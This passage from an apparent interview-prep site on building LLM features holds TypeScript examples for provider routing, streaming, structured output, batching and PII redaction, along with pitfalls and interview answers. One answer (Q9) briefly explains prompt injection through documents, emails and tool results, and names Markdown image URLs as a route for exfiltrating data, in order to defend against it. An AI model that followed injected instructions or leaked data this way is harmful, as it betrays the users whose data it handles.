    { provider: openaiProvider, model: config.models.largeFallback },     // evaluated on our golden set
  ],
  small: [
    { provider: anthropicProvider, model: config.models.smallPrimary },
    { provider: openaiProvider, model: config.models.smallFallback },
  ],
};

export async function complete(req: LlmRequest): Promise&lt;LlmResult&gt; {
  let last: LlmError | undefined;
  for (const { provider, model } of ROUTES[req.tier]) {
    if (breaker.isOpen(provider.name)) continue;            // skip a provider that is failing hard
    for (let attempt = 0; attempt &lt; 3; attempt++) {
      if (req.signal?.aborted) throw new LlmError('aborted', 'timeout', 'router');
      try {
        const result = await provider.complete(req, model);
        breaker.recordSuccess(provider.name);
        metrics.llmCall(req.feature, result);               // tokens, cost, latency, model
        return result;
      } catch (e) {
        const err = e instanceof LlmError ? e : new LlmError(String(e), 'server', provider.name);
        last = err;
        if (!err.retryable) throw err;                      // a 400 fails on every provider: our bug
        breaker.recordFailure(provider.name);
        if (err.kind === 'overloaded' || err.kind === 'rate_limit') break; // shed load to next provider
        await sleep(Math.random() * Math.min(8_000, 500 * 2 ** attempt));
      }
    }
  }
  throw last ?? new LlmError('no healthy provider', 'server', 'router');
}</code></pre>

<h3>Example 2 — Streaming chat hook (web) with batched renders</h3>
<pre><code class="language-ts">// hooks/useChatStream.ts
export function useChatStream() {
  const [text, setText] = useState('');
  const [status, setStatus] = useState&lt;'idle' | 'streaming' | 'done' | 'error'&gt;('idle');
  const ctrl = useRef&lt;AbortController | null&gt;(null);

  const send = useCallback(async (conversationId: string, message: string) =&gt; {
    ctrl.current?.abort();                        // a new send cancels the old stream
    const ac = (ctrl.current = new AbortController());
    setText(''); setStatus('streaming');
    let pending = '', raf = 0;
    const flush = () =&gt; { raf = 0; const chunk = pending; pending = ''; setText((t) =&gt; t + chunk); };

    try {
      const res = await fetch('/api/chat/stream', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'include',                   // session cookie: OUR auth, not a provider key
        body: JSON.stringify({ conversationId, message }),
        signal: ac.signal,
      });
      if (res.status === 429) { setStatus('error'); return; }   // show "daily limit reached"
      if (!res.ok) throw new Error('HTTP ' + res.status);
      for await (const evt of readSSE(res)) {
        if (evt.event === 'delta') {
          pending += JSON.parse(evt.data).text;
          if (!raf) raf = requestAnimationFrame(flush);           // at most one render per frame
        } else if (evt.event === 'done') setStatus('done');
        else if (evt.event === 'error') setStatus('error');       // keep partial text visible + Retry
      }
    } catch (e) {
      if ((e as Error).name !== 'AbortError') setStatus('error');
    } finally {
      if (raf) cancelAnimationFrame(raf);
      flush();
    }
  }, []);

  const stop = useCallback(() =&gt; ctrl.current?.abort(), []);   // server sees close → aborts provider call
  useEffect(() =&gt; () =&gt; ctrl.current?.abort(), []);             // unmount = stop paying
  return { text, status, send, stop };
}</code></pre>

<h3>Example 3 — Natural-language booking with structured output + business validation</h3>
<p>A meeting-room tablet or app lets users type "book a 6-seater tomorrow 3–4 for design sync". The model only <em>parses</em>. Code decides.</p>
<pre><code class="language-ts">export async function proposeBooking(utterance: string, user: User) {
  const res = await anthropic.messages.parse({
    model: config.models.extract,
    max_tokens: 400,
    system: 'Extract a meeting-room request. Now: ' + nowIso(user.tz) + ' (' + user.tz + '). Null when unknown.',
    messages: [{ role: 'user', content: utterance }],
    output_config: { format: zodOutputFormat(BookingIntent) },
  });
  const intent = res.parsed_output;
  if (!intent || intent.action !== 'book') return { kind: 'clarify', question: 'What would you like to do?' };

  // Business rules live in code, not in the prompt:
  const start = parseIsoInZone(intent.startIso, user.tz);
  const end = parseIsoInZone(intent.endIso, user.tz);
  if (!start || !end) return { kind: 'clarify', question: 'For what time?' };
  if (end &lt;= start) return { kind: 'clarify', question: 'The end time is before the start time.' };
  if (start &lt; new Date()) return { kind: 'clarify', question: 'That time has passed. Did you mean a later slot?' };

  const rooms = await bookingApi.findFree({ start, end, minCapacity: intent.minCapacity ?? 1, userId: user.id });
  return { kind: 'confirm', rooms: rooms.slice(0, 3), start, end, title: intent.title ?? 'Meeting' };
  // The UI shows a confirm sheet; the booking API (with its own conflict checks) is called on tap.
}</code></pre>

<h3>Example 4 — Nightly batch summarization via the Batch API</h3>
<pre><code class="language-ts">// jobs/summarizeTickets.ts — offline work: ~50% cheaper, no latency requirement
export async function submitNightlyBatch(tickets: Ticket[]) {
  const batch = await anthropic.messages.batches.create({
    requests: tickets.map((t) =&gt; ({
      custom_id: 'ticket-' + t.id + '-v' + PROMPT_VERSION,   // idempotent key; results come back unordered
      params: {
        model: config.models.summarize,
        max_tokens: 300,
        system: SUMMARY_SYSTEM,                               // identical prefix → cacheable
        messages: [{ role: 'user', content: redact(t.body) }],
      },
    })),
  });
  await db.batchJobs.insert({ id: batch.id, kind: 'ticket-summary', status: 'submitted' });
}

export async function collectBatch(batchId: string) {
  const b = await anthropic.messages.batches.retrieve(batchId);
  if (b.processing_status !== 'ended') return 'pending';     // poll from a scheduler, not a busy loop
  for await (const r of await anthropic.messages.batches.results(batchId)) {
    const ticketId = r.custom_id.split('-')[1];
    if (r.result.type === 'succeeded') {
      const text = r.result.message.content.filter((c) =&gt; c.type === 'text').map((c) =&gt; c.text).join('');
      await db.tickets.update(ticketId, { summary: text, summaryVersion: PROMPT_VERSION });
    } else {
      await db.retryQueue.push({ ticketId, reason: r.result.type });  // errored / expired / canceled
    }
  }
  return 'done';
}</code></pre>

<h3>Example 5 — Pseudonymize PII before the call, restore after</h3>
<pre><code class="language-ts">const EMAIL = /[\\w.+-]+@[\\w-]+\\.[\\w.-]+/g;
const PHONE = /\\+?\\d[\\d\\s-]{8,}\\d/g;

export function pseudonymize(input: string) {
  const vault = new Map&lt;string, string&gt;();
  let n = 0;
  const swap = (kind: string) =&gt; (match: string) =&gt; {
    const token = '[' + kind + '_' + ++n + ']';
    vault.set(token, match);
    return token;
  };
  const text = input.replace(EMAIL, swap('EMAIL')).replace(PHONE, swap('PHONE'));
  const restore = (out: string) =&gt; out.replace(/\\[(EMAIL|PHONE)_\\d+\\]/g, (t) =&gt; vault.get(t) ?? t);
  return { text, restore };
}

const { text, restore } = pseudonymize(customerEmailBody);
const draft = await complete({ feature: 'reply-draft', tier: 'large', system: REPLY_SYSTEM,
  messages: [{ role: 'user', content: text }], maxTokens: 600 });
const reply = restore(draft.text);   // the provider never saw the real email address or phone number
// Regex is a floor, not a ceiling: names, addresses and IDs need NER/DLP tooling.</code></pre>

` },

// ─────────────────────────────────────────────────────────────
{ id: "pitfalls", title: "🕳️ Pitfalls", collapsible: true, html: `<div class="pitfalls-part">🕳️ Edge cases</div>

<h3>1. "200 OK" but truncated</h3>
<p><code>stop_reason: max_tokens</code> (or <code>finish_reason: length</code>) means the output was cut off. For JSON that means unparseable or missing fields. Check the stop reason on every call, then raise the cap or ask for less.</p>

<h3>2. Refusals</h3>
<p>A <code>refusal</code> stop reason or content-filter finish means the output may not match your schema at all. Handle it as its own outcome with a user-facing message, not as a parse error to retry forever.</p>

<h3>3. The client disconnects mid-stream</h3>
<p>Without abort propagation, the provider keeps generating and you keep paying. Wire <code>res.on('close')</code> to <code>stream.abort()</code>. Listen on the <em>response</em>: in modern Node the request's close event can fire as soon as the body is read.</p>

<h3>4. The stream breaks halfway</h3>
<p>Generations cannot be resumed. Keep the partial text with a "Response interrupted, Retry" action, or regenerate from scratch (the result may differ). Never silently switch provider mid-stream, because the answer would change style halfway through.</p>

<h3>5. Proxies buffering SSE</h3>
<p>nginx buffering, compression middleware, some CDNs and serverless front doors collect the whole response, so the stream "works locally but arrives all at once in prod". Use <code>X-Accel-Buffering: no</code> and <code>Cache-Control: no-transform</code>, skip compression on the route, and pick infra that streams. Lambda behind API Gateway has historically had weaker streaming support than Lambda function URLs, so check current docs.</p>

<h3>6. Idle timeouts kill quiet streams</h3>
<p>Load balancers often drop connections idle for ~60 s, and a reasoning model can think silently for longer. Send <code>: ping</code> comments every 15–30 s and raise the idle timeout for that route.</p>

<h3>7. Split characters and flickering Markdown</h3>
<p>A UTF-8 character can be split across chunks, so use <code>TextDecoderStream</code> (or <code>TextDecoder</code> with <code>stream: true</code>). Re-rendering Markdown per delta makes half-open code fences jump, so batch renders per frame and tolerate unclosed fences.</p>

<h3>8. Context overflow is a hard error</h3>
<p>Exceeding the window returns a 400, not a quiet truncation. Long chats and pasted documents will hit it. Count tokens near the limit and summarize old turns first.</p>

<h3>9. Token counts vary by model and language</h3>
<p>A newer model generation can tokenize the same text into noticeably more tokens, so a "same price per token" migration can still raise the bill. Non-Latin scripts and code tokenize less efficiently than English, so a Hindi support flow can cost several times more per message. Re-baseline per model and budget per locale.</p>

<h3>10. "Temperature 0" is not determinism</h3>
<p>Provider-side batching and floating point still vary outputs, and some newer reasoning models ignore or reject sampling parameters (check current docs). Design tests and caches assuming variation.</p>

<h3>11. The model does not know "now"</h3>
<p>"Tomorrow at 3" needs the current date and the user's timezone in the prompt. Put them <em>after</em> the cached prefix.</p>

<h3>12. Prompt cache silently missing</h3>
<p>A timestamp, request id or unordered JSON inside the "static" prefix, or a prefix below the provider's minimum cacheable length, drops the hit rate to zero. Verify with the cache-read counts in <code>usage</code>.</p>

<h3>13. Shared limits across environments</h3>
<p>A staging load test or runaway batch on the production key starves live traffic. Use separate keys and workspaces with their own limits, and alert on the 429 rate per key.</p>

<h3>14. Model deprecation</h3>
<p>Providers retire models on a schedule. Keep ids in config, track deprecation notices, and re-run evals before switching. A new model is a behaviour change, not a dependency bump.</p>

<h3>15. Retried side effects</h3>
<p>If an endpoint calls the LLM <em>and</em> writes (creates a ticket, sends an email), a client retry after a timeout duplicates the write. Put idempotency keys on your own endpoints, separate from LLM retries.</p>

<div class="pitfalls-part">🐛 Bugs &amp; anti-patterns</div>

<h3>Anti-pattern 1 — provider key in the client</h3>
<pre><code class="language-ts">// BAD — inlined into the JS bundle at build time; extractable from any APK / IPA / web build
const client = new OpenAI({ apiKey: process.env.EXPO_PUBLIC_OPENAI_KEY, dangerouslyAllowBrowser: true });

// GOOD — the app calls your API with the user's session; the server holds the key
const res = await fetch(API_URL + '/chat/stream', { headers: { Authorization: 'Bearer ' + sessionToken }, ... });</code></pre>

<h3>Anti-pattern 2 — an open proxy</h3>
<p>No auth, no per-user limits, no input cap on <code>/api/chat</code>, and strangers use your account for free. Authenticate, rate-limit, cap input size, and enforce per-user and per-tenant spend budgets.</p>

<h3>Anti-pattern 3 — regex over prose</h3>
<pre><code class="language-ts">// BAD
const total = Number(text.match(/Total: \\$?([\\d.]+)/)?.[1]);

// GOOD — schema-constrained output, then validate
const res = await anthropic.messages.parse({ ..., output_config: { format: zodOutputFormat(Invoice) } });
const invoice = res.parsed_output;  // typed, or null → handle</code></pre>

<h3>Anti-pattern 4 — schema-valid treated as correct</h3>
<p>Booking a room for "2025-02-30" because the field was a valid string. Structured output guarantees the shape only. Business rules, permissions and conflict checks still run in code.</p>

<h3>Anti-pattern 5 — retry storms and silent waste</h3>
<p>Retrying 400s, retrying without jitter, stacking SDK × wrapper × gateway retries, or streaming from the provider into a socket the user already closed. Retry in one layer, only retryable errors, and propagate cancellation end-to-end.</p>

<h3>Anti-pattern 6 — model ids hardcoded at call sites</h3>
<pre><code class="language-ts">// BAD — 14 files to edit when the model is retired
await anthropic.messages.create({ model: 'some-model-2024-xx-xx', ... });

// GOOD — callers ask for a capability; config maps it to a model id per environment
await complete({ feature: 'ticket-summary', tier: 'small', ... });</code></pre>

<h3>Anti-pattern 7 — volatile data at the top of the prompt</h3>
<pre><code class="language-ts">// BAD — the timestamp changes every call → the prefix never matches → zero cache hits
system: 'Now: ' + new Date().toISOString() + '\\n' + HUGE_STATIC_INSTRUCTIONS

// GOOD — stable prefix first (cached), volatile context after it
system: [{ type: 'text', text: HUGE_STATIC_INSTRUCTIONS, cache_control: { type: 'ephemeral' } }],
messages: [{ role: 'user', content: 'Now: ' + nowIso + '\\n\\n' + question }]</code></pre>

<h3>Anti-pattern 8 — rendering model output as HTML</h3>
<p><code>dangerouslySetInnerHTML</code>, or Markdown with raw HTML enabled, on model output is XSS waiting for one injected document. Render with HTML disabled, sanitize, allowlist link and image domains, and never auto-load remote images.</p>

<h3>Anti-pattern 9 — PII in your own logs</h3>
<p>Redacting carefully for the provider, then shipping the full prompt to a logging SaaS. Apply the same redaction to traces, restrict access, set retention.</p>

<h3>Anti-pattern 10 — an unevaluated fallback</h3>
<p>"If A fails, call B with the same prompt." During the next outage, B formats JSON differently and half your parses fail. A fallback is a model you have evaluated on your golden set, ideally with its own prompt variant.</p>

<h3>Anti-pattern 11 — synchronous LLM work on the request path</h3>
<p>Summarizing a 40-page upload while the user stares at a spinner until the HTTP timeout. Accept the upload, enqueue the job, return 202, and push or poll the result (see <a href="#/topic/be-queues">Queues &amp; Streaming</a>).</p>

<h3>Anti-pattern 12 — no per-feature cost attribution</h3>
<p>One key and one invoice, so nobody knows which feature tripled the bill. Tag every call with feature, tenant, model and prompt version, and chart cost per feature per day.</p>
` },

// ─────────────────────────────────────────────────────────────
{ id: "interview-qa", title: "🎤 Interview Q&A", collapsible: true, html: `
<div class="qa-block">
  <div class="qa-question">Q1. Walk me through adding an LLM feature to an existing product.</div>
  <div class="qa-answer">
    <p>I start from the task and how we measure it, not the model: inputs, outputs, a golden set of 50–100 real examples, and a latency and cost budget. Then I build a backend LLM service the clients call. It owns the key, auth and per-user quotas, versioned prompt templates, model choice from config, SSE streaming for text or structured outputs for data, timeouts and retries, output validation, and a trace per call (tokens, cost, latency, stop reason). I ship behind a flag, compare against the eval set, watch online metrics, then cut cost with caching, routing and output caps.</p>
  </div>
</div>

<div class="qa-block">
  <div class="qa-question">Q2. Where does the API key live in a React Native app?</div>
  <div class="qa-answer">
    <p>Not in the app. Anything in the bundle, including <code>EXPO_PUBLIC_</code> variables, is extractable. The app authenticates to <em>our</em> backend. The backend holds the key from a secrets manager, enforces per-user rate limits and budgets, and proxies or streams the result. If the client must connect directly for latency (realtime voice over WebRTC), the backend mints a short-lived, scoped ephemeral token after checking the user.</p>
  </div>
</div>

<div class="qa-block">
  <div class="qa-question">Q3. How do you stream tokens to a mobile UI, and what breaks in production?</div>
  <div class="qa-answer">
    <p>The provider streams SSE to my Node service. I translate that into my own events (<code>delta</code>, <code>done</code> with usage, <code>error</code> with a retryable flag) plus heartbeats. The client reads them with a streaming fetch or an XHR-based SSE library on RN, a buffered parser, a streaming UTF-8 decoder, and per-frame render batching. What breaks: proxies buffering the whole response (fix: <code>X-Accel-Buffering: no</code>, no compression), LB idle timeouts during silent reasoning (fix: heartbeats), split multi-byte characters, and not aborting the provider call when the client leaves.</p>
  </div>
</div>

<div class="qa-block">
  <div class="qa-question">Q4. How do you guarantee valid JSON from the model?</div>
  <div class="qa-answer">
    <p>Schema-constrained structured outputs (or a strict tool schema), then Zod for constraints outside the provider's supported schema subset. Truncation (<code>max_tokens</code>) and refusals still break the guarantee, so I check the stop reason. Valid is not correct: business rules run in code before any write. Never regex over prose.</p>
  </div>
</div>

<div class="qa-block">
  <div class="qa-question">Q5. Estimate the monthly cost of a support assistant at 50K requests a day.</div>
  <div class="qa-answer">
    <p>State assumptions: 3K input tokens (2K static prompt and tools), 400 output, large model at an illustrative $3 in / $15 out per MTok. Per request that is 3,000 × 3/1M + 400 × 15/1M = $0.009 + $0.006 = $0.015. Times 50K/day is $750/day, about $22.5K/month. Caching the 2K prefix brings it to about $0.0096 (−36%), shorter answers to about $0.0074, and routing 60% of easy traffic to a small model to about $0.0033, roughly $5K/month. The real metric is cost per <em>resolved</em> conversation, and I would check today's prices.</p>
  </div>
</div>

<div class="qa-block">
  <div class="qa-question">Q6. The feature feels slow. How do you reduce latency?</div>
  <div class="qa-answer">
    <p>First split the time from traces: queueing, TTFT, decode. Then stream (perceived latency becomes TTFT), shorten outputs (decode is roughly linear in output tokens), use a smaller model on the hot path and reasoning only where it measurably helps, cache the stable prefix (cuts prefill), parallelize independent steps, move non-interactive work to queues, and keep connections warm near the provider region. Report p50 and p95, not the mean.</p>
  </div>
</div>

<div class="qa-block">
  <div class="qa-question">Q7. You're getting 429s at peak. What do you do?</div>
  <div class="qa-answer">
    <p>Short term: retries honour <code>retry-after</code> with jitter in a single layer, and batch jobs move off the interactive key or workspace. Then smooth demand: Batch API or off-peak queues for offline work, a token-aware limiter per worker, and shedding low-priority traffic first. Then reduce tokens per request (caching, shorter prompts and outputs), which raises effective capacity. Longer term: a higher tier, split workspaces or regions, or an evaluated second provider for overflow. Alert on the 429 rate.</p>
  </div>
</div>

<div class="qa-block">
  <div class="qa-question">Q8. Design a provider abstraction. What does not abstract well?</div>
  <div class="qa-answer">
    <p>Callers ask for a capability tier with normalized messages. Adapters map wire formats and normalize stop reasons, usage and errors into my own error kinds. A router owns retries, the circuit breaker and fallback order from config. What doesn't port: prompts (each model needs tuning and an eval run), tool-call formats, caching semantics (explicit vs automatic, per-model caches), structured-output schema subsets and reasoning controls. So the fallback is a model I have evaluated, and I only fall back on retryable errors, because a 400 is my bug and fails everywhere.</p>
  </div>
</div>

<div class="qa-block">
  <div class="qa-question">Q9. What is prompt injection, and how do you defend against it?</div>
  <div class="qa-answer">
    <p>Untrusted text steering the model: direct (the user) or indirect (hidden in docs, emails, pages, tool results), and indirect is worse. Prompt wording only lowers the rate, so I design for containment: tools run with the end user's permissions, side effects need approval, no unattended loop gets private data plus untrusted content plus an outbound channel, and output renders with HTML disabled and no auto-loaded remote images (Markdown image URLs can exfiltrate data). Classifiers and an injection red-team eval set add layers.</p>
  </div>
</div>

<div class="qa-block">
  <div class="qa-question">Q10. A healthcare customer asks how we handle PII.</div>
  <div class="qa-answer">
    <p>Minimize (send only the fields the task needs). Redact or pseudonymize with NER/DLP tooling, not only regex, and restore server-side if needed. Check the provider's retention and training terms, zero-retention options, and regional processing for residency (I verify current terms rather than quote from memory). Redact our own traces, with access control and retention limits. If data cannot leave their boundary, the options are a provider endpoint in their cloud account or a self-hosted model, with the quality and ops cost quantified.</p>
  </div>
</div>

<div class="qa-block">
  <div class="qa-question">Q11. FDE scenario: the customer says "the assistant is slow".</div>
  <div class="qa-answer">
    <p>Get specifics: which flow, when, p50 or tail, what network or device. Pull traces and break each request into client→API, rate-limit waits, hidden SDK retries, retrieval and tool calls, TTFT and decode. Usual culprits: no streaming, long outputs, a reasoning model on a simple route, serial tool chains, retries during 429 storms, cold starts plus a TLS handshake per call, or a proxy buffering SSE. Fix the biggest slice, show before/after p95 from the same traces, and add a latency SLO alert.</p>
  </div>
</div>

<div class="qa-block">
  <div class="qa-question">Q12. FDE scenario: the customer's LLM bill tripled this month.</div>
  <div class="qa-answer">
    <p>Cost = calls × tokens per call × price, so find which factor moved by breaking spend down by feature, tenant, model and day. Typical causes: a new heavy feature or tenant, a retry loop or runaway agent (calls per task jumped), unbounded chat history (input tokens per call jumped), a prompt change that broke caching (cache-read share fell to zero), a model switch with a different tokenizer or price, or batch work moved onto the live API. Then add guards: per-tenant budgets and alerts, max turns, history summarization, cache-hit monitoring, and a cost-per-successful-task dashboard.</p>
  </div>
</div>

<div class="callout success">
  <div class="callout-title">Interviewer's green-flag list for this topic</div>
  <ul>
    <li>Keys server-side, with per-user auth, quotas and budgets. Ephemeral tokens for direct-client cases.</li>
    <li>SSE streaming with your own event vocabulary, abort propagation, heartbeats and buffering-aware infra.</li>
    <li>Structured outputs plus code-side validation. Checks <code>stop_reason</code> every time.</li>
    <li>Cost maths out loud with stated assumptions. Levers named in order of impact.</li>
    <li>Retries only retryable errors, with jitter, in one layer. Fallbacks and model upgrades get evals.</li>
    <li>Prompt injection framed as containment. PII handled in logs too.</li>
  </ul>
</div>

<div class="qa-block">
  <div class="qa-question">Q13. Which errors do you retry, how do you retry them, and why is retrying a 400 a bug?</div>
  <div class="qa-answer">
    <p>I retry only what can succeed on a second attempt: 408, 409, 429, 5xx and "overloaded" responses, and network errors. I never retry 400 (bad request, context too long), 401/403 or 404 (bad model id), because a 400 is my bug: the same request fails on every attempt and on every provider, so retrying or falling back just multiplies cost and latency.</p>
    <p>How: full-jitter backoff, <code>random(0, min(cap, base·2^attempt))</code>, honour the provider's <code>retry-after</code>, and cap attempts. Retries live in <strong>one layer</strong> only: SDKs already retry (2 by default), so SDK × wrapper × gateway retries can turn one click into a dozen calls during an incident.</p>
  </div>
</div>
` },

  ]
});
